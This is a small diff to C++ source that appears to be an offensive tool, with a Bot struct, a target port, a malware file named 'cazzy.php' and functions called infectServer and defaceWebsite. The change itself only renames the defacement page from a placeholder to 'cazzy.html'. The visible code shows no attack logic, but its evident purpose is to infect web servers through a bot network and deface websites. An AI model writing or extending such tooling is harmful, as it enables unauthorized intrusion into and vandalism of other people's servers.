@@ -13,7 +13,7 @@
 #define MAX_THREADS 100
 #define TARGET_PORT 80
 #define MALWARE_FILE_NAME "cazzy.php"
-#define HTML_FILE_NAME "your_html_file.html"
+#define HTML_FILE_NAME "cazzy.html"
 
 struct Bot {
     std::string ip;
@@ -34,7 +34,7 @@ void infectServer(const std::string& target) {
 }
 
 void defaceWebsite(const std::string& target) {
-    std::ifstream htmlFile("your_html_file.html");
+    std::ifstream htmlFile("cazzy.html");
     std::string htmlContent((std::istreambuf_iterator<char>(htmlFile)),
                              std::istreambuf_iterator<char>());
 
